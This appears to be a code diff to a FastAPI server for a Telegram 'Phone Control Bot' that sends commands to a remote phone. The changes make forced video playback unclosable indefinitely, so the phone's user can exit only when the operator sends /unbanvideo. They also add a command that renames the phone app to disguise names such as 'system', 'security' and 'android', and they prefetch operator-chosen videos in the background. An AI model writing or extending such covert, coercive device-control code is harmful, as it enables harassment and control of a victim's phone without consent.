@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Header, HTTPException, Request
+from fastapi import FastAPI, Header, HTTPException
 from typing import Optional
 import os
 import asyncio
@@ -14,7 +14,6 @@ state = {
     "last_seen": None,
     "command_callbacks": {},
     "raw_links": [],
-    # Сессия выбора параметров видео: {chat_id: {step, video_cmd, video_num/url}}
     "video_sessions": {},
 }
 
@@ -22,6 +21,8 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "")
 DEVICE_SECRET = os.environ.get("DEVICE_SECRET", "secret123")
 SELF_URL = os.environ.get("SELF_URL", "")
+
+VALID_NAMES = ["android", "security", "безопасность", "звонки", "system", "phonecontrol"]
 
 
 async def keep_alive():
@@ -105,7 +106,6 @@ def normalize_google_drive_url(url: str) -> str:
 
 
 def video_lock_keyboard():
-    """Inline кнопки: заблокировать выход или нет"""
     return {
         "inline_keyboard": [
             [
@@ -117,10 +117,9 @@ def video_lock_keyboard():
 
 
 async def start_video_flow(chat_id: str, video_cmd: str, video_num: int = 0, video_url: str = ""):
-    """Начинаем диалог выбора параметров видео"""
     state["video_sessions"][chat_id] = {
-        "step": "lock",          # lock → duration → done
-        "video_cmd": video_cmd,  # "video" или "play_raw"
+        "step": "lock",
+        "video_cmd": video_cmd,
         "video_num": video_num,
         "video_url": video_url,
         "lock": False,
@@ -152,17 +151,16 @@ async def process_callback(callback: dict):
         await answer_callback(cb_id, "🔓 Без блокировки")
         session["lock"] = False
         session["step"] = "duration"
-        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = без ограничения, можно закрыть сразу)_")
+        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = без ограничения, крестик через 3 сек)_")
 
     elif data == "vlock_yes":
         await answer_callback(cb_id, "🔒 Блокировка включена")
         session["lock"] = True
         session["step"] = "duration"
-        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = смотреть до конца видео, выйти нельзя пока не кончится)_")
+        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = бесконечно, выйти только через /unbanvideo)_")
 
 
 async def process_update(update: dict):
-    # Callback от inline кнопок
     if "callback_query" in update:
         await process_callback(update["callback_query"])
         return
@@ -178,7 +176,7 @@ async def process_update(update: dict):
         await send_tg(chat_id, "⛔ Нет доступа.")
         return
 
-    # Если идёт сессия выбора параметров видео
+    # Сессия выбора параметров видео
     session = state["video_sessions"].get(chat_id)
     if session and session["step"] == "duration":
         if not text.isdigit():
@@ -190,7 +188,7 @@ async def process_update(update: dict):
         state["video_sessions"].pop(chat_id, None)
 
         lock_str = "🔒 заблокирован" if session["lock"] else "🔓 без блокировки"
-        dur_str = f"{duration} сек" if duration > 0 else ("до конца видео" if session["lock"] else "сразу")
+        dur_str = f"{duration} сек" if duration > 0 else ("бесконечно" if session["lock"] else "без ограничения")
 
         await send_tg(chat_id, f"✅ Запускаю видео\nВыход: {lock_str}\nОбязательное время: {dur_str}")
 
@@ -209,7 +207,6 @@ async def process_update(update: dict):
         await enqueue_command(chat_id, cmd, desc)
         return
 
-    # Обычные команды
     if text in ("/start", "/help"):
         await send_tg(chat_id, (
             "📱 *Phone Control Bot*\n\n"
@@ -226,11 +223,14 @@ async def process_update(update: dict):
             "/sound <0-10> — установить громкость\n\n"
             "*Видео:*\n"
             "/video1, /video2, /video3 — встроенные видео\n"
-            "/addraw <url> — добавить ссылку на видео\n"
+            "/addraw <url> — добавить ссылку (скачается сразу)\n"
             "/lists — список сохранённых ссылок\n"
             "/raw <номер> — воспроизвести по номеру\n"
             "/delvideo <номер> — удалить ссылку и кэш\n"
-            "/unbanvideo — разблокировать выход из видео"
+            "/unbanvideo — разблокировать выход из видео\n\n"
+            "*Прочее:*\n"
+            "/name <имя> — переименовать приложение\n"
+            f"Доступные имена: {', '.join(VALID_NAMES)}"
         ))
 
     elif text == "/on":
@@ -307,6 +307,13 @@ async def process_update(update: dict):
         num = len(state["raw_links"])
         preview = url[:60] + "..." if len(url) > 60 else url
         await send_tg(chat_id, f"✅ Ссылка добавлена под номером *{num}*\nURL: `{preview}`")
+        if state["active"]:
+            cmd_id = str(uuid.uuid4())[:8]
+            state["pending_commands"].append({"cmd": "prefetch", "url": url, "_id": cmd_id})
+            state["command_callbacks"][cmd_id] = chat_id
+            await send_tg(chat_id, "📥 Видео отправлено на фоновое скачивание.")
+        else:
+            await send_tg(chat_id, "⚠️ Телефон оффлайн — скачается при следующем подключении.")
 
     elif text == "/lists":
         if not state["raw_links"]:
@@ -353,6 +360,16 @@ async def process_update(update: dict):
             await send_tg(chat_id, "⚠️ Сначала включи режим командой /on")
         else:
             await enqueue_command(chat_id, {"cmd": "unban_video"}, "разблокировать выход из видео")
+
+    elif text.startswith("/name "):
+        if not state["active"]:
+            await send_tg(chat_id, "⚠️ Сначала включи режим командой /on")
+        else:
+            name = text[6:].strip().lower()
+            if name not in VALID_NAMES:
+                await send_tg(chat_id, f"⚠️ Доступные имена: {', '.join(VALID_NAMES)}")
+                return
+            await enqueue_command(chat_id, {"cmd": "rename", "name": name}, f"переименовать в {name}")
 
     elif text == "/status":
         online = "🟢 Онлайн" if phone_online() else "🔴 Оффлайн"
